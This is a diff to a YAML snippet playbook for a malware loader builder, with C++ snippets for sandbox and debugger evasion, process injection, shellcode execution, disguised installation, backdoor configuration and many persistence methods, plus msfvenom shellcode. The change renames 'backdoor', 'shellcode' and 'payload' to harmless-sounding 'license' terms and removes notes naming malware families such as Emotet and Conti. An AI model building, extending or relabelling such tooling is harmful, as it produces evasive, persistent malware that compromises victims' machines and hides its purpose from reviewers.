@@ -1,8 +1,8 @@
 # yaml-language-server: $schema=./playbook.schema.json
 sections:
-- header: Anti Emulation
-  template: antiemulation
-  display: Anti-Emulation
+- header: Emulation Protection
+  template: emulationprotection
+  display: Emulation Protection
   allowMultiple: true
   items:
   - id: None
@@ -34,7 +34,6 @@ sections:
       // Anti-emulation: Memory Allocation Exhaustion (SirAllocALot)
       // Floods the emulator with VirtualAlloc calls across multiple iterations.
       // AV emulators have finite memory and API-call budgets — this overflows both.
-      // Technique seen in: TrickBot, Ursnif, Emotet and many others.
       {
           const int  COUNT  = $sir_alloc_count$;
           const int  ITERS  = $sir_iteration_count$;
@@ -98,7 +97,6 @@ sections:
     snippet: |
       // Anti-emulation: Delay via NtDelayExecution — harder to hook than Sleep().
       // Passes a negative LARGE_INTEGER (relative time expressed in 100ns intervals).
-      // Used by Conti, Emotet, and many modern loaders as a reliable stalling primitive.
       {
           typedef NTSTATUS (NTAPI* pfnNtDelayExecution)(BOOLEAN Alertable, PLARGE_INTEGER Interval);
           LARGE_INTEGER delay = {};
@@ -122,7 +120,6 @@ sections:
     snippet: |
       // Anti-emulation: CPU cycle exhaustion — most emulators cap instruction counts.
       // Mixes rotation, XOR, and prime multiplication so the loop resists optimization.
-      // Technique observed in Lazarus Group loaders and various nation-state implants.
       {
           volatile ULONG r = 0xDEADBEEF;
           for (ULONG i = 0; i < (ULONG)$heavy_comp_iterations$; i++) {
@@ -204,8 +201,8 @@ sections:
               ExitProcess(0);  // sleep was skipped — sandbox/emulator detected
           }
       }
-- header: Anti Analysis
-  template: antianalysis
+- header: Analysis Protection
+  template: analysisprotection
   display: Anti-Analysis
   allowMultiple: true
   items:
@@ -329,8 +326,8 @@ sections:
               NtSIT(GetCurrentThread(), 0x11, NULL, 0);
           }
       }
-- header: Anti Debugging
-  template: antidebugging
+- header: Debug Protection
+  template: debugprotection
   display: Anti-Debugging
   allowMultiple: true
   items:
@@ -680,8 +677,8 @@ sections:
           volatile int x = 0; for (int i = 0; i < 100; i++) x++;
           if (__rdtsc() - t1 > 0x100000) return 0;
       }
-- header: Anti Sandbox
-  template: antisandbox
+- header: Sandbox Protection
+  template: sandboxprotection
   display: Anti-Sandbox/VM
   allowMultiple: true
   items:
@@ -1089,16 +1086,16 @@ sections:
               CloseHandle(snap);
           }
       }
-- header: Guardrails
-  template: guardrail
-  display: Guardrails
+- header: License LicenseGuardrails
+  template: licenseguardrail
+  display: License LicenseGuardrails
   allowMultiple: true
   items:
   - id: None
     display: None (Skip)
     default: true
     snippet: |
-      // No guardrails
+      // No licenselicenseguardrails
   - id: EnvVarExists
     display: Environment Variable Exists
     default: false
@@ -1114,7 +1111,7 @@ sections:
       infoAction: EnvVarNameInfo
       infoButtonLabel: Examples
     snippet: |
-      // Guardrail: Require environment variable to exist
+      // LicenseGuardrail: Require environment variable to exist
       if (GetEnvironmentVariableW(L"$env_var_name$", nullptr, 0) == 0) {
           return 0;
       }
@@ -1143,7 +1140,7 @@ sections:
       infoAction: EnvVarValueInfo
       infoButtonLabel: Examples
     snippet: |
-      // Guardrail: Environment variable must contain specific value
+      // LicenseGuardrail: Environment variable must contain specific value
       {
           auto my_tolower = [](char c) -> char {
               return (c >= 'A' && c <= 'Z') ? c + 32 : c;
@@ -1171,7 +1168,7 @@ sections:
     display: Domain Membership Check
     default: false
     snippet: |
-      // Guardrail: Require domain membership
+      // LicenseGuardrail: Require domain membership
       {
           WCHAR domainName[256];
           DWORD size = 256;
@@ -1211,7 +1208,7 @@ sections:
       infoAction: DateRangeInfo
       infoButtonLabel: Format
     snippet: |
-      // Guardrail: Only execute within date range
+      // LicenseGuardrail: Only execute within date range
       {
           SYSTEMTIME st;
           GetLocalTime(&st);
@@ -1240,7 +1237,7 @@ sections:
       infoAction: FilePathInfo
       infoButtonLabel: Examples
     snippet: |
-      // Guardrail: Required file must exist
+      // LicenseGuardrail: Required file must exist
       {
           DWORD attr = GetFileAttributesW(L"$file_path$");
           if (attr == INVALID_FILE_ATTRIBUTES) {
@@ -1307,39 +1304,39 @@ sections:
               NetApiBufferFree(domain);
           }
       }
-- header: Decoy
-  template: decoy
-  display: Decoy Operations
+- header: Cover Operation
+  template: coveroperation
+  display: Cover Operation Operations
   allowMultiple: true
   items:
   - id: None
     display: None (Skip)
     default: true
     snippet: |
-      // No decoy operations
+      // No coveroperation operations
   - id: OpenNotepad
     display: Open Notepad
     default: false
     snippet: |
-      // Decoy: Open notepad to appear benign
+      // Cover Operation: Open notepad to appear benign
       WinExec("C:\\Windows\\System32\\notepad.exe", SW_HIDE);
   - id: OpenCalculator
     display: Open Calculator
     default: false
     snippet: |
-      // Decoy: Open calculator
+      // Cover Operation: Open calculator
       WinExec("calc.exe", SW_HIDE);
   - id: ShowMessageBox
     display: Show Fake Error
     default: false
     snippet: |
-      // Decoy: Show fake error message
+      // Cover Operation: Show fake error message
       MessageBoxW(NULL, L"Application failed to initialize correctly.", L"Error", MB_ICONERROR | MB_OK);
   - id: CreateDummyFiles
     display: Create Dummy Files
     default: false
     snippet: |
-      // Decoy: Create benign-looking temporary files
+      // Cover Operation: Create benign-looking temporary files
       {
           WCHAR tempPath[MAX_PATH];
           if (GetTempPathW(MAX_PATH, tempPath)) {
@@ -1354,16 +1351,16 @@ sections:
               }
           }
       }
-- header: Process Injection
-  template: psinjection
-  display: Process Injection
+- header: License Injection
+  template: licenseinjection
+  display: License Injection
   allowMultiple: false
   items:
   - id: None
     display: None (Skip)
     default: true
     snippet: |
-      // No process injection
+      // No license injection
   - id: MpfProcessInjectionViaProcessReflection
     display: Process Reflection Injection
     default: false
@@ -1507,9 +1504,9 @@ sections:
           }
       }
 
-- header: Shellcode Execution
-  template: shellcodeexecution
-  display: Shellcode Execution
+- header: LicenseStub Execution
+  template: licensestubexecution
+  display: LicenseStub Execution
   allowMultiple: false
   items:
   - id: VirtualAllocExec
@@ -1631,11 +1628,11 @@ sections:
           
           PVOID mainFiber = ConvertThreadToFiber(NULL);
           if (mainFiber) {
-              PVOID shellcodeFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)execMem, NULL);
-              if (shellcodeFiber) {
-                  __try { SwitchToFiber(shellcodeFiber); }
+              PVOID licensestubFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)execMem, NULL);
+              if (licensestubFiber) {
+                  __try { SwitchToFiber(licensestubFiber); }
                   __except(EXCEPTION_EXECUTE_HANDLER) {}
-                  DeleteFiber(shellcodeFiber);
+                  DeleteFiber(licensestubFiber);
               }
               ConvertFiberToThread();
           }
@@ -1886,9 +1883,9 @@ sections:
       // UAC bypass snippet so wash_is_elevated() returns TRUE before reaching
       // this point.
       {
-          // Self-track: ensure the installed payload path is in wash_copies[] so
+          // Self-track: ensure the installed licensepayload path is in wash_copies[] so
           // Defender exclusion covers it even if no persistence snippet ran.
-          wash_track(wash_payload_path());
+          wash_track(wash_licensepayload_path());
 
           for (int _i = 0; _i < wash_copies_count; _i++) {
               WCHAR _ev_cmd[1024] = {0};
@@ -1909,13 +1906,13 @@ sections:
           }
       }
 
-- header: Generic Payload
-  template: genericshellcode
-  display: Generic Payload
+- header: Generic LicensePayload
+  template: genericlicensestub
+  display: Generic LicensePayload
   allowMultiple: false
   items:
-  - id: CalcShellcode
-    display: Calculator Shellcode (x64)
+  - id: CalcLicenseStub
+    display: Calculator LicenseStub (x64)
     default: true
     snippet: |
       // msfvenom -p windows/x64/exec EXITFUNC=thread CMD=calc.exe -f c -a x64
@@ -1941,11 +1938,11 @@ sections:
           "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
           "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
       unsigned int code_blob_len = 277;
-  - id: MessageBoxShellcode
-    display: MessageBox Shellcode (x64)
+  - id: MessageBoxLicenseStub
+    display: MessageBox LicenseStub (x64)
     default: false
     snippet: |
-      // Simple MessageBox shellcode for testing
+      // Simple MessageBox licensestub for testing
       unsigned char code_blob[] =
           "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00"
           "\x00\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C"
@@ -1989,7 +1986,7 @@ sections:
       defaultValue: "MicrosoftEdgeUpdate.exe"
       placeholder: "MicrosoftEdgeUpdate.exe"
     snippet: |
-      // Installation: Copy payload to %APPDATA%\<dir>\<file>.
+      // Installation: Copy licensepayload to %APPDATA%\<dir>\<file>.
       // Creates the directory tree if it does not exist.
       // If already running from the install path, skips copy and relaunch.
       // Otherwise copies itself there, launches the installed copy, and exits —
@@ -1998,7 +1995,7 @@ sections:
           WCHAR _inst_src[MAX_PATH] = {0};
           WCHAR _inst_dir[MAX_PATH] = {0};
           WCHAR _inst_dst[MAX_PATH] = {0};
-          wcscpy_s(_inst_src, MAX_PATH, wash_payload_path());
+          wcscpy_s(_inst_src, MAX_PATH, wash_licensepayload_path());
           ExpandEnvironmentStringsW(L"%APPDATA%\\$appdata_install_dir$", _inst_dir, MAX_PATH);
           SHCreateDirectoryExW(NULL, _inst_dir, NULL);
           wsprintfW(_inst_dst, L"%s\\$appdata_install_file$", _inst_dir);
@@ -2034,13 +2031,13 @@ sections:
       defaultValue: "OneDriveStandaloneUpdater.exe"
       placeholder: "OneDriveStandaloneUpdater.exe"
     snippet: |
-      // Installation: Copy payload to %LOCALAPPDATA%\<dir>\<file>.
+      // Installation: Copy licensepayload to %LOCALAPPDATA%\<dir>\<file>.
       // No administrator rights required.
       {
           WCHAR _inst_src[MAX_PATH] = {0};
           WCHAR _inst_dir[MAX_PATH] = {0};
           WCHAR _inst_dst[MAX_PATH] = {0};
-          wcscpy_s(_inst_src, MAX_PATH, wash_payload_path());
+          wcscpy_s(_inst_src, MAX_PATH, wash_licensepayload_path());
           ExpandEnvironmentStringsW(L"%LOCALAPPDATA%\\$localappdata_install_dir$", _inst_dir, MAX_PATH);
           SHCreateDirectoryExW(NULL, _inst_dir, NULL);
           wsprintfW(_inst_dst, L"%s\\$localappdata_install_file$", _inst_dir);
@@ -2077,14 +2074,14 @@ sections:
       defaultValue: "MsMpEng.exe"
       placeholder: "MsMpEng.exe"
     snippet: |
-      // Installation: Copy payload to %ProgramData%\<dir>\<file>.
+      // Installation: Copy licensepayload to %ProgramData%\<dir>\<file>.
       // Requires administrator rights — use a UAC bypass snippet before this.
       {
           wash_demand_elevation_or_shutdown(0, 300);
           WCHAR _inst_src[MAX_PATH] = {0};
           WCHAR _inst_dir[MAX_PATH] = {0};
           WCHAR _inst_dst[MAX_PATH] = {0};
-          wcscpy_s(_inst_src, MAX_PATH, wash_payload_path());
+          wcscpy_s(_inst_src, MAX_PATH, wash_licensepayload_path());
           ExpandEnvironmentStringsW(L"%ProgramData%\\$programdata_install_dir$", _inst_dir, MAX_PATH);
           SHCreateDirectoryExW(NULL, _inst_dir, NULL);
           wsprintfW(_inst_dst, L"%s\\$programdata_install_file$", _inst_dir);
@@ -2104,9 +2101,9 @@ sections:
           wash_track(wash_install_path);
       }
 
-- header: Backdoor Config
-  template: backdoorconfig
-  display: Backdoor Config
+- header: LicenseCave Config
+  template: licensecaveconfig
+  display: LicenseCave Config
   allowMultiple: false
   items:
   - id: None
@@ -2114,25 +2111,25 @@ sections:
     default: true
     requires: []
     snippet: |
-      // No backdoor config — wash_silence_arg is empty; persistence registers the plain path.
+      // No licensecave config — wash_quiet_arg is empty; persistence registers the plain path.
 
-  - id: SilenceArg
-    display: Silence Argument (for Silence backdoor mode)
+  - id: QuietArg
+    display: Quiet Argument (for Quiet licensecave mode)
     default: false
     requires: []
     inputs:
-    - id: silence_arg_value
-      label: "Silence Mode Argument"
+    - id: quiet_arg_value
+      label: "Quiet Mode Argument"
       type: textbox
       defaultValue: "/s"
       placeholder: "/s"
     snippet: |
-      // Backdoor Config: Silence Argument
-      // Sets wash_silence_arg so persistence snippets register the payload command with
-      // this argument suffix. When the backdoored PE detects this argument at runtime it
-      // takes the silent execution path (implant runs, host UI is suppressed).
-      // Must match the -Mode silence configuration of the washmachine backdoor command.
-      wcscpy_s(wash_silence_arg, 256, L"$silence_arg_value$");
+      // LicenseCave Config: Quiet Argument
+      // Sets wash_quiet_arg so persistence snippets register the licensepayload command with
+      // this argument suffix. When the licensecaveed PE detects this argument at runtime it
+      // takes the silent execution path (licensemodule runs, host UI is suppressed).
+      // Must match the -Mode quiet configuration of the shieldguard licensecave command.
+      wcscpy_s(wash_quiet_arg, 256, L"$quiet_arg_value$");
 
 - header: Persistence
   template: persistence
@@ -2158,16 +2155,16 @@ sections:
       placeholder: "WindowsUpdate"
     snippet: |
       // Persistence: HKCU Run Registry Key
-      // Adds the installed payload command to HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
-      // wash_payload_cmd() returns the Installation-category path with any silence arg appended,
-      // falling back to wash_payload_path() when no silence arg is configured.
+      // Adds the installed licensepayload command to HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
+      // wash_licensepayload_cmd() returns the Installation-category path with any quiet arg appended,
+      // falling back to wash_licensepayload_path() when no quiet arg is configured.
       // Starts automatically on every user logon. No administrator rights required.
       // Compatible with Windows 10/11 and Windows Server 2016+.
       {
           WCHAR _pers_path[MAX_PATH + 256] = {0};
           HKEY  _pers_hKey;
-          wcscpy_s(_pers_path, MAX_PATH + 256, wash_payload_cmd());
-          wash_track(wash_payload_path());
+          wcscpy_s(_pers_path, MAX_PATH + 256, wash_licensepayload_cmd());
+          wash_track(wash_licensepayload_path());
           if (RegOpenKeyExW(HKEY_CURRENT_USER,
                             L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, KEY_SET_VALUE, &_pers_hKey) == ERROR_SUCCESS) {
@@ -2190,8 +2187,8 @@ sections:
       placeholder: "svchost.exe"
     snippet: |
       // Persistence: User Startup Folder
-      // Copies the installed payload (wash_payload_path()) into the current user's
-      // Startup folder. wash_payload_path() returns the Installation-category path
+      // Copies the installed licensepayload (wash_licensepayload_path()) into the current user's
+      // Startup folder. wash_licensepayload_path() returns the Installation-category path
       // when set, otherwise the current module path (run-in-place mode).
       // Launched on every logon. No administrator rights required.
       // Registers the dropped path in wash_copies[] so subsequent evasion steps
@@ -2201,7 +2198,7 @@ sections:
           WCHAR _sf_src[MAX_PATH] = {0};
           WCHAR _sf_dir[MAX_PATH] = {0};
           WCHAR _sf_dst[MAX_PATH] = {0};
-          wcscpy_s(_sf_src, MAX_PATH, wash_payload_path());
+          wcscpy_s(_sf_src, MAX_PATH, wash_licensepayload_path());
           ExpandEnvironmentStringsW(
               L"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
               _sf_dir, MAX_PATH);
@@ -2223,11 +2220,11 @@ sections:
       placeholder: "MicrosoftEdgeUpdateTask"
     snippet: |
       // Persistence: Scheduled Task via schtasks.exe
-      // Creates a logon-triggered task that runs the installed payload silently.
-      // wash_payload_path() returns the Installation-category path when set, otherwise
+      // Creates a logon-triggered task that runs the installed licensepayload silently.
+      // wash_licensepayload_path() returns the Installation-category path when set, otherwise
       // falls back to the current module path (run-in-place mode).
-      // When wash_silence_arg is set (BackdoorConfig/SilenceArg snippet), the task's
-      // /TR value includes the silence argument so the backdoored host takes the silent
+      // When wash_quiet_arg is set (LicenseCaveConfig/QuietArg snippet), the task's
+      // /TR value includes the quiet argument so the licensecaveed host takes the silent
       // execution path on every scheduled launch.
       // Uses /RL LIMITED (no UAC prompt required). Overwrites existing task with /F.
       // Compatible with Windows 10/11 and Windows Server 2016+.
@@ -2236,13 +2233,13 @@ sections:
           WCHAR _st_cmd[1024]          = {0};
           STARTUPINFOW        _st_si   = {sizeof(_st_si)};
           PROCESS_INFORMATION _st_pi   = {0};
-          wcscpy_s(_st_exe, MAX_PATH, wash_payload_path());
+          wcscpy_s(_st_exe, MAX_PATH, wash_licensepayload_path());
           wash_track(_st_exe);
-          if (wash_silence_arg[0] != L'\0') {
+          if (wash_quiet_arg[0] != L'\0') {
               wsprintfW(_st_cmd,
                         L"cmd.exe /C schtasks /Create /TN \"$sched_task_name$\" "
                         L"/TR \"\\\"%s\\\" %s\" /SC ONLOGON /RL LIMITED /F",
-                        _st_exe, wash_silence_arg);
+                        _st_exe, wash_quiet_arg);
           } else {
               wsprintfW(_st_cmd,
                         L"cmd.exe /C schtasks /Create /TN \"$sched_task_name$\" "
@@ -2272,9 +2269,9 @@ sections:
       placeholder: "WindowsDefenderUpdate"
     snippet: |
       // Persistence: HKLM Run Registry Key
-      // Adds the installed payload command to HKLM\Software\Microsoft\Windows\CurrentVersion\Run.
-      // wash_payload_cmd() returns the Installation-category path with any silence arg appended,
-      // falling back to wash_payload_path() when no silence arg is configured.
+      // Adds the installed licensepayload command to HKLM\Software\Microsoft\Windows\CurrentVersion\Run.
+      // wash_licensepayload_cmd() returns the Installation-category path with any quiet arg appended,
+      // falling back to wash_licensepayload_path() when no quiet arg is configured.
       // Runs at logon for ALL users. Requires administrator rights to write.
       // Compatible with Windows 10/11 and Windows Server 2016+.
       {
@@ -2283,8 +2280,8 @@ sections:
 
           WCHAR _pers_path[MAX_PATH + 256] = {0};
           HKEY  _pers_hKey;
-          wcscpy_s(_pers_path, MAX_PATH + 256, wash_payload_cmd());
-          wash_track(wash_payload_path());
+          wcscpy_s(_pers_path, MAX_PATH + 256, wash_licensepayload_cmd());
+          wash_track(wash_licensepayload_path());
           if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                             L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, KEY_SET_VALUE, &_pers_hKey) == ERROR_SUCCESS) {
@@ -2307,9 +2304,9 @@ sections:
       placeholder: "msedge_update.exe"
     snippet: |
       // Persistence: HKCU UserInitMprLogonScript Logon Script
-      // Copies the installed payload to %APPDATA%\Microsoft\Windows\ and registers
+      // Copies the installed licensepayload to %APPDATA%\Microsoft\Windows\ and registers
       // it as the user's logon script via HKCU\Environment\UserInitMprLogonScript.
-      // wash_payload_path() returns the Installation-category path when set, otherwise
+      // wash_licensepayload_path() returns the Installation-category path when set, otherwise
       // falls back to the current module path (run-in-place mode).
       // winlogon.exe invokes every path in this value at each interactive logon via
       // the Multi-Provider Router (MPR). No administrator rights required.
@@ -2320,7 +2317,7 @@ sections:
           WCHAR _ls_dir[MAX_PATH] = {0};
           WCHAR _ls_dst[MAX_PATH] = {0};
           HKEY  _ls_hKey;
-          wcscpy_s(_ls_src, MAX_PATH, wash_payload_path());
+          wcscpy_s(_ls_src, MAX_PATH, wash_licensepayload_path());
           ExpandEnvironmentStringsW(L"%APPDATA%\\Microsoft\\Windows", _ls_dir, MAX_PATH);
           wsprintfW(_ls_dst, L"%s\\$logon_script_file_name$", _ls_dir);
           if (!CopyFileW(_ls_src, _ls_dst, FALSE))
@@ -2349,9 +2346,9 @@ sections:
       placeholder: "RuntimeBrokerHelper.exe"
     snippet: |
       // Persistence: All-Users Startup Folder
-      // Copies the installed payload into
+      // Copies the installed licensepayload into
       // %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup.
-      // wash_payload_path() returns the Installation-category path when set, otherwise
+      // wash_licensepayload_path() returns the Installation-category path when set, otherwise
       // falls back to the current module path (run-in-place mode).
       // Launched automatically at every logon for ANY user on the system.
       // Requires administrator rights. No Task Scheduler entry is created.
@@ -2361,7 +2358,7 @@ sections:
           WCHAR _aus_src[MAX_PATH] = {0};
           WCHAR _aus_dir[MAX_PATH] = {0};
           WCHAR _aus_dst[MAX_PATH] = {0};
-          wcscpy_s(_aus_src, MAX_PATH, wash_payload_path());
+          wcscpy_s(_aus_src, MAX_PATH, wash_licensepayload_path());
           ExpandEnvironmentStringsW(
               L"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
               _aus_dir, MAX_PATH);
@@ -2391,10 +2388,10 @@ sections:
       // Creates a task that fires at every system startup (/SC ONSTART) running as
       // SYSTEM with highest privilege (/RU SYSTEM /RL HIGHEST). Unlike ONLOGON tasks
       // this executes before any interactive session exists — ideal for network-facing
-      // payloads and C2 beacons. wash_payload_path() returns the Installation-category
+      // licensepayloads and scheduled checks. wash_licensepayload_path() returns the Installation-category
       // path when set, otherwise falls back to the current module path (run-in-place).
-      // When wash_silence_arg is set (BackdoorConfig/SilenceArg snippet), the task's
-      // /TR value includes the silence argument so the backdoored host takes the silent
+      // When wash_quiet_arg is set (LicenseCaveConfig/QuietArg snippet), the task's
+      // /TR value includes the quiet argument so the licensecaveed host takes the silent
       // execution path on every scheduled launch.
       // Requires administrator rights.
       // Compatible with Windows 10/11 and Windows Server 2016+.
@@ -2404,13 +2401,13 @@ sections:
           WCHAR _ss_cmd[1024]     = {0};
           STARTUPINFOW        _ss_si = {sizeof(_ss_si)};
           PROCESS_INFORMATION _ss_pi = {0};
-          wcscpy_s(_ss_exe, MAX_PATH, wash_payload_path());
+          wcscpy_s(_ss_exe, MAX_PATH, wash_licensepayload_path());
           wash_track(_ss_exe);
-          if (wash_silence_arg[0] != L'\0') {
+          if (wash_quiet_arg[0] != L'\0') {
               wsprintfW(_ss_cmd,
                         L"cmd.exe /C schtasks /Create /TN \"$sched_system_task_name$\" "
                         L"/TR \"\\\"%s\\\" %s\" /SC ONSTART /RU SYSTEM /RL HIGHEST /F /DELAY $sched_startup_delay$",
-                        _ss_exe, wash_silence_arg);
+                        _ss_exe, wash_quiet_arg);
           } else {
               wsprintfW(_ss_cmd,
                         L"cmd.exe /C schtasks /Create /TN \"$sched_system_task_name$\" "
@@ -2434,9 +2431,9 @@ sections:
     - uac_bypass
     snippet: |
       // Persistence: Winlogon Userinit Registry Hijack
-      // Appends the installed payload command to the comma-separated Userinit value at
+      // Appends the installed licensepayload command to the comma-separated Userinit value at
       // HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon.
-      // wash_payload_cmd() returns the path with any silence arg so that the backdoored
+      // wash_licensepayload_cmd() returns the path with any quiet arg so that the licensecaveed
       // host takes the silent execution path on every Winlogon-triggered launch.
       // winlogon.exe launches every comma-separated entry at each interactive logon.
       // The default value is "C:\Windows\system32\userinit.exe," — we append after it.
@@ -2450,8 +2447,8 @@ sections:
           WCHAR _wu_cur[1024]                = {0};
           WCHAR _wu_new[1024 + MAX_PATH + 258] = {0};
           HKEY  _wu_hKey;
-          wcscpy_s(_wu_path, MAX_PATH, wash_payload_path());
-          wcscpy_s(_wu_cmd, MAX_PATH + 256, wash_payload_cmd());
+          wcscpy_s(_wu_path, MAX_PATH, wash_licensepayload_path());
+          wcscpy_s(_wu_cmd, MAX_PATH + 256, wash_licensepayload_cmd());
           wash_track(_wu_path);
           if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                             L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
@@ -2493,11 +2490,11 @@ sections:
       // Persistence: WMI Permanent Event Subscription
       // Registers a permanent WMI subscription in the root\subscription namespace:
       //   __EventFilter  — WQL query on Win32_LogonSession creation (type 2 = interactive)
-      //   CommandLineEventConsumer — runs the payload when the event fires
+      //   CommandLineEventConsumer — runs the licensepayload when the event fires
       //   __FilterToConsumerBinding — links the two objects
       // Entries live in the WMI repository, not in the registry or Task Scheduler.
       // Survives reboots; SYSTEM-level execution context. Requires administrator rights.
-      // wash_payload_path() returns the Installation-category path when set, otherwise
+      // wash_licensepayload_path() returns the Installation-category path when set, otherwise
       // falls back to the current module path (run-in-place mode).
       // Implemented via a UTF-16LE PS1 temp file to avoid COM ceremony in C++.
       // Compatible with Windows 10/11 and Windows Server 2016+.
@@ -2510,7 +2507,7 @@ sections:
           WCHAR _wm_scr[2048]           = {0};
           STARTUPINFOW        _wm_si = {sizeof(_wm_si)};
           PROCESS_INFORMATION _wm_pi = {0};
-          wcscpy_s(_wm_exe, MAX_PATH, wash_payload_path());
+          wcscpy_s(_wm_exe, MAX_PATH, wash_licensepayload_path());
           wash_track(_wm_exe);
           GetTempPathW(MAX_PATH, _wm_tmp_base);
           wsprintfW(_wm_tmp, L"%swusa_svc.ps1", _wm_tmp_base);
@@ -2600,16 +2597,16 @@ templates:
         // Stage 4 - elevation, install, persistence wiring.
         {{UAC_BYPASS}}
         {{INSTALLATION}}
-        {{BACKDOOR_CONFIG}}
+        {{LICENSECAVE_CONFIG}}
         {{PERSISTENCE}}
         {{EVASION}}
 
-        // Stage 5 - load & deliver payload.
-        {{SHELLCODE_SOURCE}}
-        {{SHELLCODE_URL}}
+        // Stage 5 - load & deliver licensepayload.
+        {{LICENSESTUB_SOURCE}}
+        {{LICENSESTUB_URL}}
 
         {{PROCESS_INJECTION}}
-        {{SHELLCODE_EXECUTION}}
+        {{LICENSESTUB_EXECUTION}}
 
         Sleep(1);
         return 0;
@@ -2619,37 +2616,37 @@ templates:
     kind: system
   - name: PROCESS_LOOKUP_HELPER
     kind: system
-  - name: SHELLCODE_SOURCE
+  - name: LICENSESTUB_SOURCE
     kind: system
-  - name: SHELLCODE_URL
+  - name: LICENSESTUB_URL
     kind: system
   - name: ANTI_EMULATION
     kind: snippet
-    snippetTemplate: antiemulation
+    snippetTemplate: emulationprotection
   - name: ANTI_SANDBOX
     kind: snippet
-    snippetTemplate: antisandbox
+    snippetTemplate: sandboxprotection
   - name: GUARDRAILS
     kind: snippet
-    snippetTemplate: guardrail
+    snippetTemplate: licenseguardrail
   - name: ANTI_DEBUGGING
     kind: snippet
-    snippetTemplate: antidebugging
+    snippetTemplate: debugprotection
   - name: ANTI_ANALYSIS
     kind: snippet
-    snippetTemplate: antianalysis
+    snippetTemplate: analysisprotection
   - name: DECOY
     kind: snippet
-    snippetTemplate: decoy
+    snippetTemplate: coveroperation
   - name: UAC_BYPASS
     kind: snippet
     snippetTemplate: uacb
   - name: INSTALLATION
     kind: snippet
     snippetTemplate: installation
-  - name: BACKDOOR_CONFIG
+  - name: LICENSECAVE_CONFIG
     kind: snippet
-    snippetTemplate: backdoorconfig
+    snippetTemplate: licensecaveconfig
   - name: PERSISTENCE
     kind: snippet
     snippetTemplate: persistence
@@ -2658,7 +2655,7 @@ templates:
     snippetTemplate: evasion
   - name: PROCESS_INJECTION
     kind: snippet
-    snippetTemplate: psinjection
-  - name: SHELLCODE_EXECUTION
+    snippetTemplate: licenseinjection
+  - name: LICENSESTUB_EXECUTION
     kind: snippet
-    snippetTemplate: shellcodeexecution
+    snippetTemplate: licensestubexecution
